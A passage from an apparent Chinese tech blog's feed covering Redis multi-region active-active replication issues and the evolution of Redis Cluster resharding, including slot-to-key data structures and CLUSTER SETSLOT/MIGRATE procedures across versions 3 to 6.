在处理命令时需要记录上下文信息，存在上下文丢失隐患；</li><li>社区版 Redis 无法识别新添加的自定义命令，存在兼容性问题；</li></ul></li><li>案例：未知；</li></ul></li></ul><p><img src="/assets/images/redis-az-sync-data-loopback-plan-new-cmd.png" alt="数据回环之自定义命令方案" loading="lazy"></p><ul><li><p><strong>注释</strong>：</p><ul><li><p>思路：基于社区版 Redis 的注释功能 <a href="https://github.com/redis/redis/pull/9326">Pull&#x2F;9326</a> 进行扩展，添加更加丰富属性；</p></li><li><p>特点：</p><ul><li>能够尽可能的兼容社区版 Redis ；</li><li>需要考虑 AOF 持久化访问对存量数据注释信息影响；</li></ul></li><li><p>案例：未知；</p></li></ul></li></ul><p><img src="/assets/images/redis-az-sync-data-loopback-plan-annotation.png" alt="数据回环之注释方案" loading="lazy"></p><ul><li><strong>特殊连接</strong>：<ul><li><p>思路：基于 Redis 的 ACL 特性进行改造，从连接维度区分命令的数据来源，针对于不同用户连接上的命令执行不同的处理策略；</p></li><li><p>特点：</p><ul><li>不需要变更现有的 Redis 协议或新增命令，完全兼容社区版 Redis ；</li><li>可能仅能依靠 Redis 资深进行数据同步，无法依赖于外部组件；</li></ul></li><li><p>案例：未知；</p></li></ul></li></ul><p><img src="/assets/images/redis-az-sync-data-loopback-plan-conn.png" alt="数据回环之特殊连接方案" loading="lazy"></p><h3 id="3-2-2、数据重放"><a href="#3-2-2、数据重放" class="headerlink" title="3.2.2、数据重放"></a>3.2.2、数据重放</h3><p>在数据同步的过程中不可避免的会由于网络等原因导致命令重发，而考虑到 Redis 的部分命令不是幂等操作的，比如 List 数据类型的相关操作（LPUSH 、 RPUSH 等），对此不加限制就有可能会导致数据不一致的问题，这就会导致 <strong>数据重放</strong> 问题。在 Redis 主从同步模型中，其实也会出现这个问题，不过目前社区对此的处理方案是：<strong>主从同步期间，主库不处理从库的执行结果，并且主库不会主动向从库重发数据。</strong> </p><p>在 Redis 异地多活的场景下，数据重放的问题主要体现在两个场景中：<strong>代码级别的重试</strong> 和 <strong>断点续传</strong> 。代码级别的重试是为了保障同步组件的健壮性，断点续传是为了应对各种故障情况后的数据同步的连续性。业界提供的一些应对数据重放问题的方案与实现：</p><ul><li><strong>命令级别操作序号</strong> ：<ul><li>思路：<ul><li>源集群：Redis 在转发命令之前，在命令中添加一些本地递增的命令序号，并将命令序号也转发给目标集群；</li><li>目标集群：接收到源集群的命令后，会依据上次记录的命令序号判断当前写操作是否合法，并选择是否执行，之后更新记录的命源集群的命令序号；</li></ul></li><li>特点：<ul><li>判重的逻辑可以在一个中心转发节点中实现，也可以在 Redis 内部实现；</li><li>需要考虑 Redis 主从切换等情况的影响；</li></ul></li><li>案例：阿里、百度等；</li></ul></li></ul><p><img src="/assets/images/redis-az-sync-data-repeated-plan-opid.png" alt="数据重放之命令级别操作序号方案" loading="lazy"></p><h3 id="3-2-3、数据冲突"><a href="#3-2-3、数据冲突" class="headerlink" title="3.2.3、数据冲突"></a>3.2.3、数据冲突</h3><h4 id="3-2-3-1、CRDT方案"><a href="#3-2-3-1、CRDT方案" class="headerlink" title="3.2.3.1、CRDT方案"></a>3.2.3.1、CRDT方案</h4><h4 id="3-2-3-2、Redo-Undo方案"><a href="#3-2-3-2、Redo-Undo方案" class="headerlink" title="3.2.3.2、Redo&#x2F;Undo方案"></a>3.2.3.2、Redo&#x2F;Undo方案</h4><h3 id="3-2-4、数据修复"><a href="#3-2-4、数据修复" class="headerlink" title="3.2.4、数据修复"></a>3.2.4、数据修复</h3><h3 id="3-2-5、数据校验"><a href="#3-2-5、数据校验" class="headerlink" title="3.2.5、数据校验"></a>3.2.5、数据校验</h3><h2 id="3-3、高可用"><a href="#3-3、高可用" class="headerlink" title="3.3、高可用"></a>3.3、高可用</h2><h2 id="3-4、运维操作"><a href="#3-4、运维操作" class="headerlink" title="3.4、运维操作"></a>3.4、运维操作</h2><h3 id="3-4-1、主从切换"><a href="#3-4-1、主从切换" class="headerlink" title="3.4.1、主从切换"></a>3.4.1、主从切换</h3><h3 id="3-4-2、纵向扩缩容"><a href="#3-4-2、纵向扩缩容" class="headerlink" title="3.4.2、纵向扩缩容"></a>3.4.2、纵向扩缩容</h3><h3 id="3-4-3、横向扩缩容"><a href="#3-4-3、横向扩缩容" class="headerlink" title="3.4.3、横向扩缩容"></a>3.4.3、横向扩缩容</h3><h3 id="3-4-4、增删集群"><a href="#3-4-4、增删集群" class="headerlink" title="3.4.4、增删集群"></a>3.4.4、增删集群</h3><h2 id="3-5、监控报警"><a href="#3-5、监控报警" class="headerlink" title="3.5、监控报警"></a>3.5、监控报警</h2><h3 id="3-5-1、同步延迟"><a href="#3-5-1、同步延迟" class="headerlink" title="3.5.1、同步延迟"></a>3.5.1、同步延迟</h3><h1 id="五、业界实践"><a href="#五、业界实践" class="headerlink" title="五、业界实践"></a>五、业界实践</h1><h2 id="5-1、阿里异地多活方案"><a href="#5-1、阿里异地多活方案" class="headerlink" title="5.1、阿里异地多活方案"></a>5.1、阿里异地多活方案</h2><h2 id="5-2、百度异地多活方案"><a href="#5-2、百度异地多活方案" class="headerlink" title="5.2、百度异地多活方案"></a>5.2、百度异地多活方案</h2><h3 id="5-2-1、架构"><a href="#5-2-1、架构" class="headerlink" title="5.2.1、架构"></a>5.2.1、架构</h3><p><img src="/assets/images/redis-az-sync-baidu-arch.png" alt="百度Redis三集群多活架构" loading="lazy"></p><p><strong>架构图解释：</strong></p><ul><li>图中展示了三地域 Redis 集群的异地多活架构；</li><li>每个集群包含两个分片，每个分片中包含一主一从的两个 Redis 节点，每个 Redis 节点对应一个同步组件；</li><li>每个分片中只有 Redis 主库对应的同步组件处于运行状态（同步数据），当 Redis 出现主从切换后，新主库对应的同步组件会被激活，老主库（此时切换为从库或下线）的同步组件会被停用；</li><li>每个同步组件都会定期访问其对应的 Redis 实例，从而获取 Redis 的主从状态；</li></ul><p><img src="/assets/images/redis-az-sync-baidu-dataflow.png" alt="百度Redis多活集群数据流链路" loading="lazy"></p><p><strong>架构图解释：</strong></p><ul><li>图中展示了两地域 Redis 集群在异地多活架构下的数据同步链路；</li><li>客户端的写入流量经由 Proxy 转发给集群内部的 Redis 实例；</li><li>Redis 将写入数据持久化到 RDB（定期写入） 和 AOFs（实时写入） 中（定制化的混合持久化机制）；</li><li>同步组件监听获取对应 Redis 实例的增量 AOFs 数据，并在过滤（避免循环复制）后将其转发给目标集群；</li></ul><h3 id="5-2-2、特点"><a href="#5-2-2、特点" class="headerlink" title="5.2.2、特点"></a>5.2.2、特点</h3><h2 id="5-3、携程异地多活方案"><a href="#5-3、携程异地多活方案" class="headerlink" title="5.3、携程异地多活方案"></a>5.3、携程异地多活方案</h2><h2 id="5-4、京东异地多活方案"><a href="#5-4、京东异地多活方案" class="headerlink" title="5.4、京东异地多活方案"></a>5.4、京东异地多活方案</h2><h2 id="5-5、银联异地多活方案"><a href="#5-5、银联异地多活方案" class="headerlink" title="5.5、银联异地多活方案"></a>5.5、银联异地多活方案</h2><h1 id="六、参考链接"><a href="#六、参考链接" class="headerlink" title="六、参考链接"></a>六、参考链接</h1><ul><li><p><a href="https://help.aliyun.com/document_detail/71881.html">Redis全球多活简介 - 阿里云</a></p></li><li><p><a href="https://mp.weixin.qq.com/s?__biz=MjM5MDI3MjA5MQ==&mid=2697268883&idx=1&sn=0f2c4005672ecd91696916c569201474&chksm=8376f1a7b40178b1418303d695aa346bec5bde080a1974e7794e7b99318653992eeca88c4c62&scene=27#wechat_redirect">携程Redis跨IDC多向同步实践</a></p><ul><li><a href="https://tech.ctrip.com/wp-content/uploads/2019/06/5%E3%80%81Redis%E5%A4%9A%E6%95%B0%E6%8D%AE%E4%B8%AD%E5%BF%83%E5%8F%8C%E5%90%91%E5%90%8C%E6%AD%A5-%E6%90%BA%E7%A8%8B%E7%A5%9D%E8%BE%B0-1.pdf">Redis多数据中心双向同步 - 携程技术沙龙</a></li></ul></li><li><p><a href="https://www.freebuf.com/articles/database/345785.html">京东原生Redis跨数据中心双向同步优化实践</a></p></li><li><p><a href="https://www.modb.pro/doc/7426">银联分布式缓存的异地多活实践</a></p></li><li><p><a href="https://developer.aliyun.com/article/635628">阿里云redis CRDT产品支持说明</a></p></li><li><p><a href="https://pages.lip6.fr/Marc.Shapiro/papers/RR-7687.pdf">Conflict-free Replicated Data Types</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Redis </category>
          
          <category> 异地多活 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
            <tag> 异地多活 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Redis扩缩容演进史与奇思妙想</title>
      <link href="/2022/12/13/redis-resharding/"/>
      <url>/2022/12/13/redis-resharding/</url>
      
        <content type="html"><![CDATA[<p>Redis 的扩缩容方案在 RedisCluster 中发生了很多的改造与优化，其中主要包括对于 Slot 和 Keys 映射关系的优化，从最初的跳表，到基数树，再到最新的柔性数组的相关优化。同时 Redis 的非社区Cluster 模式下的扩缩容在业界在诞生了很多有意思的设计思路，比如 Codis 提供的同步&#x2F;异步迁移方案，选择性复制以及旁路扩缩容的迁移方案等。这篇文章将简略的描述一下当前业界实现的 Redis 的扩缩容方案。</p><h1 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h1><p>这里主要描述的是 Redis 的横向扩缩容。</p><h1 id="二、Redis-扩缩容演进史"><a href="#二、Redis-扩缩容演进史" class="headerlink" title="二、Redis 扩缩容演进史"></a>二、Redis 扩缩容演进史</h1><h2 id="2-1、映射关系存储结构演进"><a href="#2-1、映射关系存储结构演进" class="headerlink" title="2.1、映射关系存储结构演进"></a>2.1、映射关系存储结构演进</h2><p>由于我们需要能够高效的依据 Slot 来找到对应的 Keys 信息，从而实现数据的迁移，因此我们需要记录 Slot 和 Keys 的映射关系，Redis 也在不断的优化这种存储结构，从而在实现高效遍历的时候又能够节省存储所带来的内存开销。</p><h3 id="2-1-1、SkipList-存储结构"><a href="#2-1-1、SkipList-存储结构" class="headerlink" title="2.1.1、SkipList 存储结构"></a>2.1.1、SkipList 存储结构</h3><ul><li><p>版本范围：3.0.0 ~ 3.2.13（以下分析基于 3.2.13 版本）</p></li><li><p>设计特点：</p><ul><li>使用一个全局结构体变量（ server.cluster-&gt;slots_to_keys ）来记录 Slot 和 Keys 的映射关系（集群模式下仅允许 DB-0 ）；</li><li>存储方式：<ul><li>Score ： Key 的 SlotID ；</li><li>Value ：Key 的 robj 指针；</li></ul></li></ul></li><li><p>数据变更流程：</p><ul><li>新增：当数据被写入 DB 之后，就会调用 slotToKeyAdd 函数将数据在额外存储在 slots_to_keys 中 ，时间复杂度 O(logN)；</li><li>变更：由于 slots_to_keys 中记录的是 Key 的信息，因此如果只是 Key 的 Value 变化了， slots_to_keys 中的信息保持不变；</li><li>删除：当数据被从 DB 中删除之后，就会调用 slotToKeyDel 函数将数据也从 slots_to_keys 删除 ，时间复杂度 O(logN)；</li><li>查找：每次查找的过程相当于是依据 SlotID 在 slots_to_keys 中查找对应的 Keys ，时间复杂度 O(logN)；</li></ul></li><li><p>数据结构：</p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// server.cluster 全局结构体</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">clusterState</span> &#123;</span><br>    ...<br><br>    zskiplist *slots_to_keys;    <span class="hljs-comment">// 跳表的方式记录Slot和Keys的映射关系</span><br><br>    ...<br>&#125; clusterState;<br><br><span class="hljs-comment">// 存储映射关系的跳表</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">zskiplist</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">zskiplistNode</span> *<span class="hljs-title">header</span>, *<span class="hljs-title">tail</span>;</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> length;<br>    <span class="hljs-type">int</span> level;<br>&#125; zskiplist;<br><br><span class="hljs-comment">// 跳表内部的节点结构</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">zskiplistNode</span> &#123;</span><br>    robj *obj;<br>    <span class="hljs-type">double</span> score;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">zskiplistNode</span> *<span class="hljs-title">backward</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">zskiplistLevel</span> &#123;</span><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">zskiplistNode</span> *<span class="hljs-title">forward</span>;</span><br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> span;<br>    &#125; level[];<br>&#125; zskiplistNode;<br></code></pre></td></tr></table></figure></li></ul><h3 id="2-1-2、RadixTree-存储结构"><a href="#2-1-2、RadixTree-存储结构" class="headerlink" title="2.1.2、RadixTree 存储结构"></a>2.1.2、RadixTree 存储结构</h3><ul><li><p>版本范围：4.0.0 ~ 6.2.7（以下分析基于 6.2.7 版本）</p></li><li><p>代码记录：<a href="https://github.com/redis/redis/commit/c4716d33459199a768e0cb40f469671b778471bd">commit &#x2F; c4716d33459199a768e0cb40f469671b778471bd</a> </p></li><li><p>设计特点：</p><ul><li>使用一个全局结构体变量（ server.cluster-&gt;slots_to_keys ）来记录 Slot 和 Keys 的映射关系（集群模式下仅允许 DB-0 ）；</li><li>相比于使用跳表的方式更节省内存；</li><li>存储方式：<ul><li>Value 由两部分组成： <ul><li>前两个字节：分别是 SlotID &gt;&gt; 8 和 SlotID &amp; 0xFF 的值；</li><li>后部分字节：实际的 Key 的信息；</li></ul></li></ul></li></ul></li><li><p>数据变更流程：</p><ul><li>新增：当数据被写入 DB 之后，就会调用 slotToKeyAdd 函数将数据在额外存储在 slots_to_keys 中 ；</li><li>变更：由于 slots_to_keys 中记录的是 Key 的信息，因此如果只是 Key 的 Value 变化了， slots_to_keys 中的信息保持不变；</li><li>删除：当数据被从 DB 中删除之后，就会调用 slotToKeyDel 函数将数据也从 slots_to_keys 删除；</li><li>查找：每次查找的过程相当于是依据 SlotID 在 slots_to_keys 中查找对应的 Keys；</li></ul></li><li><p>数据结构：</p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// server.cluster 全局结构体</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">clusterState</span> &#123;</span><br>    ...<br><br>    rax *slots_to_keys;    <span class="hljs-comment">// 基数树的方式记录Slot和Keys的映射关系</span><br><br>    ...<br>&#125; clusterState;<br><br><span class="hljs-comment">// 存储映射关系的基数树</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">rax</span> &#123;</span><br>    raxNode *head;<br>    <span class="hljs-type">uint64_t</span> numele;<br>    <span class="hljs-type">uint64_t</span> numnodes;<br>&#125; rax;<br><br><span class="hljs-comment">// 基数树内部的节点结构</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">raxNode</span> &#123;</span><br>    <span class="hljs-type">uint32_t</span> iskey:<span class="hljs-number">1</span>;     <span class="hljs-comment">/* Does this node contain a key? */</span><br>    <span class="hljs-type">uint32_t</span> isnull:<span class="hljs-number">1</span>;    <span class="hljs-comment">/* Associated value is NULL (don&#x27;t store it). */</span><br>    <span class="hljs-type">uint32_t</span> iscompr:<span class="hljs-number">1</span>;   <span class="hljs-comment">/* Node is compressed. */</span><br>    <span class="hljs-type">uint32_t</span> size:<span class="hljs-number">29</span>;     <span class="hljs-comment">/* Number of children, or compressed string len. */</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> data[];<br>&#125; raxNode;<br></code></pre></td></tr></table></figure></li></ul><h3 id="2-1-3、DictEntryPtr-存储结构"><a href="#2-1-3、DictEntryPtr-存储结构" class="headerlink" title="2.1.3、DictEntryPtr 存储结构"></a>2.1.3、DictEntryPtr 存储结构</h3><ul><li><p>版本范围：7.0.0 ~ 7.0.5（写这篇文章时最新版本为 7.0.5 ，以下分析基于 7.0.5 版本）</p></li><li><p>代码记录：<a href="https://github.com/redis/redis/pull/9356">pull &#x2F; 9356</a> </p></li><li><p>设计特点：</p><ul><li>在 redisDb 的结构体中增加一个 16384 大小的数组来记录 Slot 和 Key 的映射关系，每个数组中的节点都记录了对应 Slot 中 Key 的 dictEntry 的指针地址；</li><li>相比于使用基数树的方式更节省内存；</li><li>写性能提升约 50%，读性能降低约 10% ；</li><li>存储方式：<ul><li>Value 由两部分组成： <ul><li>前两个字节：分别是 SlotID &gt;&gt; 8 和 SlotID &amp; 0xFF 的值；</li><li>后部分字节：实际的 Key 的信息；</li></ul></li></ul></li></ul></li><li><p>数据变更流程：</p><ul><li>新增：当数据被写入 DB 之后，就会调用 slotToKeyAddEntry 函数将数据所在 Entry 的指针地址插入对应 Slot数据的链表中，并将链表的头部第一个元素 head 设置为新插入的指针；</li><li>变更：当由于碎片整理需要变更已有 Key 的 Entry 地址地址时，会调用 slotToKeyReplaceEntry 函数更新对应的链表节点信息，将该 Entry 移动到链表的头部；</li><li>删除：当数据被从 DB 中删除之后，就会调用 slotToKeyDelEntry 函数将链表中记录的 Entry 节点删除；</li><li>查找：每次查找的过程相当于是依据 SlotID 找到对应的数组索引，然后从链表的头部 head 开始遍历数据；</li></ul></li><li><p>数据结构：</p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// server.db 全局结构体</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">redisDb</span> &#123;</span><br>    ...<br><br>    clusterSlotToKeyMapping *slots_to_keys; <span class="hljs-comment">// Slot和Keys的映射数组</span><br>&#125; redisDb;<br><br><span class="hljs-comment">// 存储映射关系的数组结构</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">clusterSlotToKeyMapping</span> &#123;</span><br>    slotToKeys by_slot[<span class="hljs-number">16384</span>];<br>&#125; clusterSlotToKeyMapping;<br><br><span class="hljs-comment">// 每一个Slot和Key的数组项</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slotToKeys</span> &#123;</span><br>    <span class="hljs-type">uint64_t</span> count;             <span class="hljs-comment">// Slot中Key的数量</span><br>    dictEntry *head;            <span class="hljs-comment">// 记录的第一个数据项的dictEntry指针地址</span><br>&#125; slotToKeys;<br><br><br><span class="hljs-comment">// 改造后的dictEntry</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">dictEntry</span> &#123;</span><br>    <span class="hljs-type">void</span> *key;<br>    <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>        <span class="hljs-type">void</span> *val;<br>        <span class="hljs-type">uint64_t</span> u64;<br>        <span class="hljs-type">int64_t</span> s64;<br>        <span class="hljs-type">double</span> d;<br>    &#125; v;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">dictEntry</span> *<span class="hljs-title">next</span>;</span>     <span class="hljs-comment">// 同一个哈希桶中的下一个节点</span><br>    <span class="hljs-type">void</span> *metadata[];           <span class="hljs-comment">// 柔性数组记录相同Slot的Key链表</span><br>&#125; dictEntry;<br></code></pre></td></tr></table></figure></li></ul><h2 id="2-2、扩缩容流程演进"><a href="#2-2、扩缩容流程演进" class="headerlink" title="2.2、扩缩容流程演进"></a>2.2、扩缩容流程演进</h2><h3 id="2-2-1、Redis-3系"><a href="#2-2-1、Redis-3系" class="headerlink" title="2.2.1、Redis 3系"></a>2.2.1、Redis 3系</h3><ul><li>版本范围：3.0.0 ~ 3.2.13（以下分析基于 3.2.13 版本）</li><li>版本特点：<ul><li>首次支持集群模式下的扩缩容；</li><li>支持使用 redis-trib.rb 脚本实现集群初始化与扩缩容；</li></ul></li><li>扩容流程（假设从节点 A 中迁移数据到新节点 N）：<ul><li>加入需要扩容的节点 N，命令： <code>cluster meet N_ip N_port</code> ；</li><li>连接目标节点 N ，设置 Slot 状态为 <code>importing</code> ，命令：<code>cluster setslot $slotid importing $sourceNodeID</code> ；</li><li>连接源节点 A ，设置 Slot 状态为 <code>migrating</code> ，命令： <code>cluster setslot $slotid migrating $targetNodeID</code> ；</li><li>从源节点 A 获取待迁移数据，命令： <code>cluster getkeysinslot $slotid $count</code> ；</li><li>在源节点 A 上执行同步阻塞的数据迁移，支持两种不同的命令格式：<ul><li><code>migrate $targetIP $targetPort $key $dbid $timeout [copy|replace]</code> ；</li><li><code>migrate $targetIP $targetPort &quot;&quot; $dbid $timeout [copy|replace] keys $key1 $key2 ... $keyN</code> ；</li></ul></li><li>将源节点 A 上的所有对应 Slot 的数据全部迁移到目标节点 N 之后，设置迁移 Slot 的归属节点信息，理论上需要连接源节点和目标节点来设置，命令：<code>cluster setslot $slotid node $targetNodeID</code> ；</li></ul></li><li>缩容流程（假设从节点 N 中迁移数据到节点 A）：<ul><li>连接目标节点 A ，设置 Slot 状态为 <code>importing</code> ，命令：<code>cluster setslot $slotid importing $sourceNodeID</code> ；</li><li>连接源节点 N ，设置 Slot 状态为 <code>migrating</code> ，命令： <code>cluster setslot $slotid migrating $targetNodeID</code> ；</li><li>从源节点 N 获取待迁移数据，命令： <code>cluster getkeysinslot $slotid $count</code> ；</li><li>在源节点 N 上执行同步阻塞的数据迁移，支持两种不同的命令格式：<ul><li><code>migrate $targetIP $targetPort $key $dbid $timeout [copy|replace]</code> ；</li><li><code>migrate $targetIP $targetPort &quot;&quot; $dbid $timeout [copy|replace] keys $key1 $key2 ... $keyN</code> ；</li></ul></li><li>将源节点 N 上的所有对应 Slot 的数据全部迁移到目标节点 A 之后，设置迁移 Slot 的归属节点信息，理论上需要连接源节点和目标节点来设置，命令：<code>cluster setslot $slotid node $targetNodeID</code> ；</li><li>通知集群所有节点要删除的节点信息，命令： <code>cluster forget $delNodeID</code> ；</li></ul></li></ul><h3 id="2-2-2、Redis-4系"><a href="#2-2-2、Redis-4系" class="headerlink" title="2.2.2、Redis 4系"></a>2.2.2、Redis 4系</h3><ul><li>版本范围：3.0.0 ~ 4.0.14（以下分析基于 4.0.14 版本）</li><li>版本特点：<ul><li>迁移命令支持密码认证；</li></ul></li><li>扩容流程（假设从节点 A 中迁移数据到新节点 N）：<ul><li>加入需要扩容的节点 N，命令： <code>cluster meet N_ip N_port</code> ；</li><li>连接目标节点 N ，设置 Slot 状态为 <code>importing</code> ，命令：<code>cluster setslot $slotid importing $sourceNodeID</code> ；</li><li>连接源节点 A ，设置 Slot 状态为 <code>migrating</code> ，命令： <code>cluster setslot $slotid migrating $targetNodeID</code> ；</li><li>从源节点 A 获取待迁移数据，命令： <code>cluster getkeysinslot $slotid $count</code> ；</li><li>在源节点 A 上执行同步阻塞的数据迁移，支持两种不同的命令格式： <ul><li><code>migrate $targetIP $targetPort $key $dbid $timeout [copy|replace|auth $password]</code> ；</li><li><code>migrate $targetIP $targetPort &quot;&quot; $dbid $timeout [copy|replace|auth $password] keys $key1 $key2 ... $keyN</code> ；</li></ul></li><li>将源节点 A 上的所有对应 Slot 的数据全部迁移到目标节点 N 之后，设置迁移 Slot 的归属节点信息，理论上需要连接源节点和目标节点来设置，命令：<code>cluster setslot $slotid node $targetNodeID</code> ；</li></ul></li><li>缩容流程（假设从节点 N 中迁移数据到节点 A）：<ul><li>连接目标节点 A ，设置 Slot 状态为 <code>importing</code> ，命令：<code>cluster setslot $slotid importing $sourceNodeID</code> ；</li><li>连接源节点 N ，设置 Slot 状态为 <code>migrating</code> ，命令： <code>cluster setslot $slotid migrating $targetNodeID</code> ；</li><li>从源节点 N 获取待迁移数据，命令： <code>cluster getkeysinslot $slotid $count</code> ；</li><li>在源节点 N 上执行同步阻塞的数据迁移，支持两种不同的命令格式： <ul><li><code>migrate $targetIP $targetPort $key $dbid $timeout [copy|replace|auth $password]</code> ；</li><li><code>migrate $targetIP $targetPort &quot;&quot; $dbid $timeout [copy|replace|auth $password] keys $key1 $key2 ... $keyN</code> ；</li></ul></li><li>将源节点 N 上的所有对应 Slot 的数据全部迁移到目标节点 A 之后，设置迁移 Slot 的归属节点信息，理论上需要连接源节点和目标节点来设置，命令：<code>cluster setslot $slotid node $targetNodeID</code> ；</li><li>通知集群所有节点要删除的节点信息，命令： <code>cluster forget $delNodeID</code> ；</li></ul></li></ul><h3 id="2-2-3、Redis-5系"><a href="#2-2-3、Redis-5系" class="headerlink" title="2.2.3、Redis 5系"></a>2.2.3、Redis 5系</h3><ul><li>版本范围：5.0.0 ~ 5.0.14（以下分析基于 5.0.14 版本）</li><li>版本特点：<ul><li>使用 redis-cli 实现了 redis-trib.rb 脚本的功能，移除了 redis-trib.rb 脚本；</li></ul></li><li>扩容流程（假设从节点 A 中迁移数据到新节点 N）：<ul><li>加入需要扩容的节点 N，命令： <code>cluster meet N_ip N_port</code> ；</li><li>连接目标节点 N ，设置 Slot 状态为 <code>importing</code> ，命令：<code>cluster setslot $slotid importing $sourceNodeID</code> ；</li><li>连接源节点 A ，设置 Slot 状态为 <code>migrating</code> ，命令： <code>cluster setslot $slotid migrating $targetNodeID</code> ；</li><li>从源节点 A 获取待迁移数据，命令： <code>cluster getkeysinslot $slotid $count</code> ；</li><li>在源节点 A 上执行同步阻塞的数据迁移，支持两种不同的命令格式： <ul><li><code>migrate $targetIP $targetPort $key $dbid $timeout [copy|replace|auth $password]</code> ；</li><li><code>migrate $targetIP $targetPort &quot;&quot; $dbid $timeout [copy|replace|auth $password] keys $key1 $key2 ... $keyN</code> ；</li></ul></li><li>将源节点 A 上的所有对应 Slot 的数据全部迁移到目标节点 N 之后，设置迁移 Slot 的归属节点信息，理论上需要连接源节点和目标节点来设置，命令：<code>cluster setslot $slotid node $targetNodeID</code> ；</li></ul></li><li>缩容流程（假设从节点 N 中迁移数据到节点 A）：<ul><li>连接目标节点 A ，设置 Slot 状态为 <code>importing</code> ，命令：<code>cluster setslot $slotid importing $sourceNodeID</code> ；</li><li>连接源节点 N ，设置 Slot 状态为 <code>migrating</code> ，命令： <code>cluster setslot $slotid migrating $targetNodeID</code> ；</li><li>从源节点 N 获取待迁移数据，命令： <code>cluster getkeysinslot $slotid $count</code> ；</li><li>在源节点 N 上执行同步阻塞的数据迁移，支持两种不同的命令格式： <ul><li><code>migrate $targetIP $targetPort $key $dbid $timeout [copy|replace|auth $password]</code> ；</li><li><code>migrate $targetIP $targetPort &quot;&quot; $dbid $timeout [copy|replace|auth $password] keys $key1 $key2 ... $keyN</code> ；</li></ul></li><li>将源节点 N 上的所有对应 Slot 的数据全部迁移到目标节点 A 之后，设置迁移 Slot 的归属节点信息，理论上需要连接源节点和目标节点来设置，命令：<code>cluster setslot $slotid node $targetNodeID</code> ；</li><li>通知集群所有节点要删除的节点信息，命令： <code>cluster forget $delNodeID</code> ；</li></ul></li></ul><h3 id="2-2-4、Redis-6系"><a href="#2-2-4、Redis-6系" class="headerlink" title="2.2.4、Redis 6系"></a>2.2.4、Redis 6系</h3><ul><li>版本范围：6.0.0 ~ 6.2.7（以下分析基于 6.2.7 版本）</li><li>版本特点：<ul><li>迁移命令支持 ACL 密码认证；</li></ul></li><li>扩容流程（假设从节点 A 中迁移数据到新节点 N）：<ul><li>加入需要扩容的节点 N，命令： <code>cluster meet N_ip N_port</code> ；</li><li>连接目标节点 N ，设置 Slot 状态为 <code>importing</code> ，命令：<code>cluster setslot $slotid importing $sourceNodeID</code> ；</li><li>连接源节点 A ，设置 Slot 状态为 <code>migrating</code> ，命令： <code>cluster setslot $slotid migrating $targetNodeID</code> ；</li><li>从源节点 A 获取待迁移数据，命令： <code>cluster getkeysinslot $slotid $count</code> ；</li><li>在源节点 A 上执行同步阻塞的数据迁移，支持两种不同的命令格式： <ul><li><code>migrate $targetIP $targetPort $key $dbid $timeout [copy|replace|auth $password|auth2 $username $password]</code> ；</li><li><code>migrate $targetIP $targetPort &quot;&quot; $dbid $timeout [copy|replace|auth $password|auth2 $username $password] keys $key1 $key2 ... $keyN</code> ；</li></ul></li><li>将源节点 A 上的所有对应 Slot 的数据全部迁移到目标节点 N 之后，设置迁移 Slot 的归属节点信息，理论上需要连接源节点和目标节点来设置，命令：<code>cluster setslot $slotid node $targetNodeID</code> ；</li></ul></li><li>缩容流程（假设从节点 N 中迁移数据到节点 A）：<ul><li>连接目标节点 A ，设置 Slot 状态为 <code>importing</code> ，命令：<code>cluster setslot $slotid importing $sourceNodeID</code> ；</li><li>连接源节点 N ，设置 Slot 状态为 <code>migrating</code> ，命令： <code>cluster setslot $slotid migrating $targetNodeID</code> ；</li><li>从源节点 N 获取待迁移数据，命令： <code>cluster getkeysinslot $slotid $count</code> ；</li><li>在源节点 N 上执行同步阻塞的数据迁移，支持两种不同的命令格式： <ul><li><code>migrate $targetIP $targetPort $key $dbid $timeout [copy|replace|auth $password|auth2 $username $password]</code> ；</li><li><code>migrate $targetIP $targetPort &quot;&quot; $dbid $timeout [copy|replace|auth $password|auth2 $username $password] keys $key1 $key2 ... $keyN</code> ；</li></ul></li><li>将源节点 N 上的所有对应 Slot 的数据全部迁移到目标节点 A 之后，设置迁移 Slot 的归属节点信息，理论上需要连接源节点和目标节点来设置，命令：<code>cluster setslot $slotid node $targetNodeID</code> ；</li><li>通知集群所有节点要删除的节点信息，命令： <code>cluster forget $delNodeID</code> ；</li></ul></li></ul><h3 id="2-2-5、Redis-7系"><a href="#2-2-5、Redis-7系" class="headerlink" title="2.2.5、Redis 